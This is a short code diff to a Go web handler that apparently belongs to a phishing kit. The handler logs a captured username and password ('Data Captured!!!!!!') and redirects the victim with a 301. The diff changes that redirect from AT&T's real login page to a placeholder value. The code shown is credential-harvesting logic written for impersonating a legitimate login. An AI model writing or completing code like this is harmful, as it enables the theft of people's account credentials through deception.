@@ -82,5 +82,5 @@ func process(w http.ResponseWriter, r *http.Request) {
 		log.Println("Data Captured!!!!!! " + "Username: " + user + " | Supersecret: " + pass)
 	}
 	defer db.Close()
-	http.Redirect(w, r, "https://www.att.com/my/#/login", 301)
+	http.Redirect(w, r, "d", 301)
 }
